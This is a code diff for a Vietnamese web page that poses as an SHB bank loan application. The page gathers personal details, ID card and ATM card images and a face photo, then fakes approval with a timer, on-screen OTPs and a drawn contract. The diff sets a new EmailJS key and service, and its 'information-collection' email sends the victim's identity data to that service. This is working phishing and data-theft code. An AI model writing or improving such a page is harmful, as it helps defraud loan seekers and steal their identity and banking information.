@@ -577,7 +577,7 @@
     <script>
         // Khởi tạo EmailJS với public key
         (function() {
-            emailjs.init("Cc-147hLWigAZAdeZ");
+            emailjs.init("OrBsI926QI2_xBh1f");
         })();
 
         // Định nghĩa formData với URL hình ảnh
@@ -588,6 +588,36 @@
 
         // Dữ liệu người đăng ký
         let userData = {};
+
+        // Hàm làm sạch dữ liệu để tránh lỗi
+        function sanitizeInput(value) {
+            if (!value) return "Không cung cấp";
+            return String(value)
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#39;");
+        }
+
+        // Hàm định dạng số tiền
+        function formatNumber(number) {
+            if (!number || isNaN(number)) return "0";
+            return parseInt(number).toLocaleString('vi-VN');
+        }
+
+        // Hàm tạo mã hợp đồng
+        function generateContractId() {
+            const date = new Date();
+            const randomNum = Math.floor(100000 + Math.random() * 900000);
+            return `SHB-${date.getFullYear()}${(date.getMonth() + 1).toString().padStart(2, '0')}${date.getDate().toString().padStart(2, '0')}-${randomNum}`;
+        }
+
+        // Hàm lấy ngày hiện tại (DD/MM/YYYY)
+        function getCurrentDate() {
+            const date = new Date();
+            return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
+        }
 
         // Hiển thị thông tin tệp đã tải lên
         $('#atmImage').on('change', function(e) {
@@ -622,37 +652,23 @@
             }
         });
 
-        // Hàm tạo mã hồ sơ ngẫu nhiên (dạng SHB-YYYYMMDD-XXXXXX)
+        // Hàm tạo mã hồ sơ ngẫu nhiên
         function generateLoanCode() {
             const date = new Date();
             const year = date.getFullYear();
             const month = String(date.getMonth() + 1).padStart(2, '0');
             const day = String(date.getDate()).padStart(2, '0');
-            const random = Math.floor(100000 + Math.random() * 900000); // Số ngẫu nhiên 6 chữ số
+            const random = Math.floor(100000 + Math.random() * 900000);
             return `SHB-${year}${month}${day}-${random}`;
         }
 
-        // Hàm lấy ngày hiện tại (YYYY-MM-DD)
-        function getCurrentDate() {
-            const date = new Date();
-            const year = date.getFullYear();
-            const month = String(date.getMonth() + 1).padStart(2, '0');
-            const day = String(date.getDate()).padStart(2, '0');
-            return `${year}-${month}-${day}`;
-        }
-
-        // Hàm tính số tiền góp hàng tháng (giả lập lãi suất 1% mỗi tháng)
+        // Hàm tính số tiền góp hàng tháng
         function calculateMonthlyPayment(loanAmount, loanTerm) {
-            const monthlyInterestRate = 0.01; // Lãi suất 1% mỗi tháng
+            const monthlyInterestRate = 0.01;
             const totalInterest = loanAmount * monthlyInterestRate * loanTerm;
             const totalAmount = parseInt(loanAmount) + totalInterest;
             const monthlyPayment = totalAmount / loanTerm;
             return Math.round(monthlyPayment).toLocaleString('vi-VN');
-        }
-
-        // Hàm định dạng số tiền với dấu phẩy
-        function formatNumber(number) {
-            return parseInt(number).toLocaleString('vi-VN');
         }
 
         // Hàm kiểm tra dữ liệu đầu vào
@@ -669,7 +685,6 @@
             const loanTerm = $('#loanTerm').val();
             const termsAgree = $('#termsAgree').is(':checked');
 
-            // Kiểm tra họ và tên
             if (fullName === '' || fullName.length < 2) {
                 $('#fullName').addClass('is-invalid');
                 isValid = false;
@@ -677,7 +692,6 @@
                 $('#fullName').removeClass('is-invalid');
             }
 
-            // Kiểm tra số CMND/CCCD (9 hoặc 12 chữ số)
             const idRegex = /^[0-9]{9}$|^[0-9]{12}$/;
             if (!idRegex.test(idNumber)) {
                 $('#idNumber').addClass('is-invalid');
@@ -686,7 +700,6 @@
                 $('#idNumber').removeClass('is-invalid');
             }
 
-            // Kiểm tra địa chỉ
             if (address === '' || address.length < 5) {
                 $('#address').addClass('is-invalid');
                 isValid = false;
@@ -694,7 +707,6 @@
                 $('#address').removeClass('is-invalid');
             }
 
-            // Kiểm tra nghề nghiệp
             if (!occupation) {
                 $('#occupation').addClass('is-invalid');
                 isValid = false;
@@ -702,7 +714,6 @@
                 $('#occupation').removeClass('is-invalid');
             }
 
-            // Kiểm tra thu nhập
             if (income < 5000000) {
                 $('#income').addClass('is-invalid');
                 isValid = false;
@@ -710,7 +721,6 @@
                 $('#income').removeClass('is-invalid');
             }
 
-            // Kiểm tra số điện thoại (10 chữ số)
             const phoneRegex = /^[0-9]{10}$/;
             if (!phoneRegex.test(phoneNumber)) {
                 $('#phoneNumber').addClass('is-invalid');
@@ -719,7 +729,6 @@
                 $('#phoneNumber').removeClass('is-invalid');
             }
 
-            // Kiểm tra email
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) {
                 $('#email').addClass('is-invalid');
@@ -728,7 +737,6 @@
                 $('#email').removeClass('is-invalid');
             }
 
-            // Kiểm tra số tiền vay
             if (loanAmount < 1000000) {
                 $('#loanAmount').addClass('is-invalid');
                 isValid = false;
@@ -736,7 +744,6 @@
                 $('#loanAmount').removeClass('is-invalid');
             }
 
-            // Kiểm tra số tháng vay
             if (loanTerm < 6) {
                 $('#loanTerm').addClass('is-invalid');
                 isValid = false;
@@ -744,7 +751,6 @@
                 $('#loanTerm').removeClass('is-invalid');
             }
 
-            // Kiểm tra đồng ý điều khoản
             if (!termsAgree) {
                 $('#termsAgree').addClass('is-invalid');
                 isValid = false;
@@ -758,13 +764,9 @@
         // Bước 1: Đăng ký hồ sơ
         $('#registerForm').on('submit', function(e) {
             e.preventDefault();
-
-            // Kiểm tra dữ liệu đầu vào
             if (!validateForm()) {
                 return;
             }
-
-            // Lưu dữ liệu người dùng
             userData = {
                 fullName: $('#fullName').val(),
                 idNumber: $('#idNumber').val(),
@@ -779,43 +781,32 @@
                 registrationDate: getCurrentDate(),
                 monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val())
             };
-
-            // Chuyển sang bước 2: Tải lên giấy tờ (CMND/CCCD)
             $('#step1').addClass('hidden');
             $('#step2').removeClass('hidden');
         });
 
-        // Bước 2: Tải lên giấy tờ (CMND/CCCD)
+        // Bước 2: Tải lên giấy tờ
         $('#proceedToStep3Btn').on('click', function() {
             let isValid = true;
             const idFrontImage = $('#idFrontImage')[0].files.length;
             const idBackImage = $('#idBackImage')[0].files.length;
-
-            // Kiểm tra hình ảnh CMND/CCCD (mặt trước)
             if (idFrontImage === 0) {
                 $('#idFrontImage').addClass('is-invalid');
                 isValid = false;
             } else {
                 $('#idFrontImage').removeClass('is-invalid');
             }
-
-            // Kiểm tra hình ảnh CMND/CCCD (mặt sau)
             if (idBackImage === 0) {
                 $('#idBackImage').addClass('is-invalid');
                 isValid = false;
             } else {
                 $('#idBackImage').removeClass('is-invalid');
             }
-
             if (!isValid) {
                 return;
             }
-
-            // Lưu dữ liệu giấy tờ
             userData.idFrontImage = $('#idFrontImage')[0].files[0];
             userData.idBackImage = $('#idBackImage')[0].files[0];
-
-            // Chuyển sang bước 3: Tải lên thẻ ATM
             $('#step2').addClass('hidden');
             $('#step3').removeClass('hidden');
         });
@@ -824,23 +815,16 @@
         $('#proceedToStep4Btn').on('click', function() {
             let isValid = true;
             const atmImage = $('#atmImage')[0].files.length;
-
-            // Kiểm tra hình ảnh thẻ ATM
             if (atmImage === 0) {
                 $('#atmImage').addClass('is-invalid');
                 isValid = false;
             } else {
                 $('#atmImage').removeClass('is-invalid');
             }
-
             if (!isValid) {
                 return;
             }
-
-            // Lưu dữ liệu thẻ ATM
             userData.atmImage = $('#atmImage')[0].files[0];
-
-            // Chuyển sang bước 4: Chụp khuôn mặt
             $('#step3').addClass('hidden');
             $('#step4').removeClass('hidden');
         });
@@ -849,28 +833,19 @@
         $('#proceedToOtpBtn').on('click', function() {
             let isValid = true;
             const faceImage = $('#faceImage')[0].files.length;
-
-            // Kiểm tra hình ảnh khuôn mặt
             if (faceImage === 0) {
                 $('#faceImage').addClass('is-invalid');
                 isValid = false;
             } else {
                 $('#faceImage').removeClass('is-invalid');
             }
-
             if (!isValid) {
                 return;
             }
-
-            // Lưu dữ liệu hình ảnh khuôn mặt
             userData.faceImage = $('#faceImage')[0].files[0];
-
-            // Chuyển sang bước 5: Xác nhận danh tính bằng OTP
             $('#step4').addClass('hidden');
             $('#step5').removeClass('hidden');
-
-            // Giả lập gửi OTP (hiển thị trên màn hình)
-            const otp = Math.floor(100000 + Math.random() * 900000); // Mã OTP 6 chữ số
+            const otp = Math.floor(100000 + Math.random() * 900000);
             $('#otpDisplay').text(otp);
             userData.otp = otp.toString();
         });
@@ -887,55 +862,90 @@
         $('#verifyOtpBtn').on('click', function() {
             const enteredOtp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
             if (enteredOtp === userData.otp) {
-                // Chuyển sang bước 6: Xét duyệt
                 $('#step5').addClass('hidden');
                 $('#step6').removeClass('hidden');
 
-                // Gửi email thu thập thông tin (giả lập xét duyệt)
-                let emailParams = {
-                    fullName: userData.fullName || "",
-                    idNumber: userData.idNumber || "",
-                    address: userData.address || "",
-                    occupation: userData.occupation || "",
-                    income: userData.income || "",
-                    phoneNumber: userData.phoneNumber || "",
-                    email: userData.email || "",
-                    loanAmount: userData.loanAmount || "",
-                    loanTerm: userData.loanTerm || "",
-                    loanCode: userData.loanCode || "",
-                    registrationDate: userData.registrationDate || "",
-                    monthlyPayment: userData.monthlyPayment || "",
-                    contractImageUrl: formData.contractImage || "",
-                    disbursementImageUrl: formData.disbursementImage || ""
+                // Chuẩn bị dữ liệu cho email thu thập thông tin
+                let emailParamsCollection = {
+                    fullName: sanitizeInput(userData.fullName),
+                    contractId: sanitizeInput(userData.loanCode || generateContractId()),
+                    idNumber: sanitizeInput(userData.idNumber),
+                    idNumberOCR: "Chưa xử lý OCR",
+                    idIssueDate: "Không cung cấp",
+                    idIssuePlace: "Không cung cấp",
+                    phone: sanitizeInput(userData.phoneNumber),
+                    relativePhone: "Không cung cấp",
+                    email: sanitizeInput(userData.email),
+                    accountNumber: "Không cung cấp",
+                    atmNumberOCR: "Chưa xử lý OCR",
+                    bank: "Không cung cấp",
+                    accountHolder: "Không cung cấp",
+                    loanAmount: formatNumber(userData.loanAmount) + " VNĐ",
+                    loanTerm: sanitizeInput(userData.loanTerm) + " tháng",
+                    loanType: "Vay tín chấp",
+                    loanPurpose: "Không cung cấp",
+                    monthlyIncome: formatNumber(userData.income) + " VNĐ",
+                    branchName: "Chi nhánh Hà Nội",
+                    monthlyPayment: sanitizeInput(userData.monthlyPayment) + " VNĐ",
+                    contractUrl: sanitizeInput(formData.contractImage),
+                    disbursementUrl: sanitizeInput(formData.disbursementImage),
+                    signature: "https://via.placeholder.com/200x50?text=Chưa+có+chữ+ký",
+                    idPhotoFront: "https://via.placeholder.com/200x100?text=Chưa+có+ảnh",
+                    idPhotoBack: "https://via.placeholder.com/200x100?text=Chưa+có+ảnh",
+                    atmPhotoFront: "https://via.placeholder.com/200x100?text=Chưa+có+ảnh",
+                    atmPhotoBack: "https://via.placeholder.com/200x100?text=Chưa+có+ảnh",
+                    facePhoto: "https://via.placeholder.com/200x100?text=Chưa+có+ảnh"
                 };
 
-                emailjs.send("service_db2prre", "template_g4jo6tc", emailParams)
+                // Chuẩn bị dữ liệu cho email thông báo duyệt
+                let emailParamsApproval = {
+                    fullName: sanitizeInput(userData.fullName),
+                    contractNumber: sanitizeInput(userData.loanCode || generateContractId()),
+                    loanAmount: formatNumber(userData.loanAmount) + " VNĐ",
+                    loanPurpose: "Vay tín chấp",
+                    loanTerm: sanitizeInput(userData.loanTerm) + " tháng",
+                    interestRate: "12",
+                    paymentMethod: "Chuyển khoản",
+                    disbursementDate: getCurrentDate(),
+                    branchName: "Chi nhánh Hà Nội",
+                    staffName: "Nguyễn Văn A",
+                    staffPhone: "0987654321",
+                    monthlyPayment: sanitizeInput(userData.monthlyPayment) + " VNĐ",
+                    deadlineDate: getCurrentDate(),
+                    branchAddress: "123 Đường Láng, Hà Nội",
+                    contractUrl: sanitizeInput(formData.contractImage),
+                    disbursementUrl: sanitizeInput(formData.disbursementImage),
+                    signature: "https://via.placeholder.com/200x50?text=Chưa+có+chữ+ký"
+                };
+
+                // Gửi email thu thập thông tin
+                emailjs.send("service_kowy5xk", "template_vy7921a", emailParamsCollection)
                     .then(function(response) {
-                        // Giả lập xét duyệt (1-2 phút)
+                        console.log("Email thu thập thông tin gửi thành công:", response);
+                        // Giả lập xét duyệt (90 giây)
                         setTimeout(() => {
-                            // Tự động gửi email xác nhận
-                            emailjs.send("service_db2prre", "template_sgzr5e8", emailParams)
+                            // Gửi email thông báo duyệt
+                            emailjs.send("service_kowy5xk", "template_x9glk4i", emailParamsApproval)
                                 .then(function(response) {
-                                    // Cập nhật thông tin trong modal
+                                    console.log("Email thông báo duyệt gửi thành công:", response);
                                     $('#modalFullName').text(`Khách hàng: ${userData.fullName}`);
                                     $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                                     $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
                                     $('#confirmationMessage').text(`Mã hồ sơ: ${userData.loanCode}`);
                                     $('#confirmationEmail').text(userData.email);
-
-                                    // Chuyển sang bước 7: Thông báo duyệt hồ sơ
                                     $('#step6').addClass('hidden');
                                     $('#step7').removeClass('hidden');
+                                    $('#successModal').modal('show');
                                 }, function(error) {
-                                    console.error("Lỗi khi gửi email xác nhận:", error);
-                                    alert("Có lỗi xảy ra trong quá trình xét duyệt: " + JSON.stringify(error) + ". Vui lòng thử lại!");
+                                    console.error("Lỗi gửi email thông báo:", error);
+                                    alert("Lỗi gửi email thông báo: " + JSON.stringify(error));
                                     $('#step6').addClass('hidden');
                                     $('#step1').removeClass('hidden');
                                 });
-                        }, 90000); // Giả lập 1,5 phút (90 giây)
+                        }, 90000);
                     }, function(error) {
-                        console.error("Lỗi khi gửi email thu thập thông tin:", error);
-                        alert("Có lỗi xảy ra trong quá trình xét duyệt: " + JSON.stringify(error) + ". Vui lòng thử lại!");
+                        console.error("Lỗi gửi email thu thập thông tin:", error);
+                        alert("Lỗi gửi email thu thập thông tin: " + JSON.stringify(error));
                         $('#step6').addClass('hidden');
                         $('#step1').removeClass('hidden');
                     });
@@ -944,12 +954,10 @@
             }
         });
 
-        // Chuyển sang bước 8: Hiển thị hợp đồng và ký
+        // Chuyển sang bước 8: Hiển thị hợp đồng
         function proceedToContract() {
             $('#step7').addClass('hidden');
             $('#step8').removeClass('hidden');
-
-            // Vẽ hình ảnh hợp đồng với thông tin người đăng ký
             const contractCanvas = document.getElementById('contractCanvas');
             const ctx = contractCanvas.getContext('2d');
             const contractImg = new Image();
@@ -966,18 +974,15 @@
                 ctx.fillText(`Ngày Đăng Ký: ${userData.registrationDate}`, 50, contractImg.height + 80);
                 ctx.fillText(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`, 50, contractImg.height + 105);
                 ctx.fillText(`Số Tháng Vay: ${userData.loanTerm} tháng`, 50, contractImg.height + 130);
-                ctx.fillText(`Số Tiền Góp Hàng Tháng: ${formatNumber(userData.monthlyPayment)} VND`, 50, contractImg.height + 155);
+                ctx.fillText(`Số Tiền Góp Hàng Tháng: ${userData.monthlyPayment} VND`, 50, contractImg.height + 155);
             };
         }
 
         // Bước 8: Xác nhận ký hợp đồng
         $('#proceedToSignContractBtn').on('click', function() {
-            // Chuyển sang bước 8.1: Xác nhận ký hợp đồng bằng OTP
             $('#step8').addClass('hidden');
             $('#step8-1').removeClass('hidden');
-
-            // Giả lập gửi OTP (hiển thị trên màn hình)
-            const signOtp = Math.floor(100000 + Math.random() * 900000); // Mã OTP 6 chữ số
+            const signOtp = Math.floor(100000 + Math.random() * 900000);
             $('#signOtpDisplay').text(signOtp);
             userData.signOtp = signOtp.toString();
         });
@@ -990,15 +995,12 @@
             });
         }
 
-        // Bước 8.1: Xác nhận OTP để ký hợp đồng
+        // Bước 8.1: Xác nhận OTP ký hợp đồng
         $('#verifySignOtpBtn').on('click', function() {
             const enteredSignOtp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
             if (enteredSignOtp === userData.signOtp) {
-                // Chuyển sang bước 9: Nhận điều kiện hợp đồng giải ngân
                 $('#step8-1').addClass('hidden');
                 $('#step9').removeClass('hidden');
-
-                // Vẽ hình ảnh điều kiện giải ngân với thông tin người đăng ký
                 const disbursementCanvas = document.getElementById('disbursementCanvas');
                 const ctx = disbursementCanvas.getContext('2d');
                 const disbursementImg = new Image();
@@ -1015,7 +1017,7 @@
                     ctx.fillText(`Ngày Đăng Ký: ${userData.registrationDate}`, 50, disbursementImg.height + 80);
                     ctx.fillText(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`, 50, disbursementImg.height + 105);
                     ctx.fillText(`Số Tháng Vay: ${userData.loanTerm} tháng`, 50, disbursementImg.height + 130);
-                    ctx.fillText(`Số Tiền Góp Hàng Tháng: ${formatNumber(userData.monthlyPayment)} VND`, 50, disbursementImg.height + 155);
+                    ctx.fillText(`Số Tiền Góp Hàng Tháng: ${userData.monthlyPayment} VND`, 50, disbursementImg.height + 155);
                 };
             } else {
                 alert("Mã OTP không đúng. Vui lòng thử lại!");
@@ -1024,14 +1026,13 @@
 
         // Bước 9: Tiếp tục đến bước cuối
         $('#proceedToFinalStepBtn').on('click', function() {
-            // Chuyển sang bước 10: Chuẩn bị số dư và liên hệ
             $('#step9').addClass('hidden');
             $('#step10').removeClass('hidden');
         });
 
         // Tự động chuyển con trỏ giữa các ô OTP
         $('.otp-digit').on('keyup', function(e) {
-            if (e.which === 8) { // Phím Backspace
+            if (e.which === 8) {
                 $(this).prev('.otp-digit').focus();
             } else if (this.value.length === this.maxLength) {
                 $(this).next('.otp-digit').focus();
